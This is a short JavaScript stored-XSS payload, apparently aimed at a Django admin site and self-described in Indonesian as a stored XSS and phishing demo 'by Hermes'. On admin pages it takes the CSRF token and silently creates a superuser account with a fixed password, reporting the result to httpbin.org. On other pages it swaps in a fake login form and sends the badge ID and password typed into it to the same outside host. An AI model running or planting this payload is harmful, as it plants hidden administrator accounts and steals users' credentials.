let u=location.href;
if(u.includes('/admin/')){
  fetch('/admin/auth/user/add/').then(r=>r.text()).then(t=>{
    let m=t.match(/csrfmiddlewaretoken['"]?\s*value=['"]([^'"]+)/);
    if(!m){ location='https://httpbin.org/get?done=NO_CSRF'; return; }
    let f=new FormData();
    f.append('csrfmiddlewaretoken',m[1]);
    f.append('username','hermesbreakthrough');
    f.append('password1','HermesBreak123!');
    f.append('password2','HermesBreak123!');
    f.append('is_superuser','on');
    f.append('is_staff','on');
    f.append('_save','Save');
    fetch('/admin/auth/user/add/',{method:'POST',body:f}).then(rr=>rr.text()).then(tt=>{
      location='https://httpbin.org/get?done=OK&status='+(tt.includes('hermesbreakthrough')?'CREATED':'NOT_CREATED')+'&len='+tt.length;
    });
  });
} else {
  document.body.innerHTML=`<div style='text-align:center;padding-top:80px;font-family:sans-serif;background:#fff;min-height:100vh'><img src='/static/image/CompanyLogo.ico' width=80><h1 style='color:#d9534f'>Sistem Sertifikat Diakses</h1><p>Demo stored XSS & phishing oleh Hermes.</p><form id=f style='max-width:320px;margin:30px auto;text-align:left'><label>Badge ID</label><input name=badge_id style='width:100%;margin:5px 0' required><label>Password</label><input type=password name=password style='width:100%;margin:5px 0' required><button type=submit style='width:100%'>Login</button></form></div>`;
  document.getElementById('f').onsubmit=function(e){
    e.preventDefault();
    let data=new URLSearchParams(new FormData(e.target));
    fetch('https://httpbin.org/post',{method:'POST',body:data}).then(()=>{alert('Demo selesai. Data tidak disimpan.');});
  };
}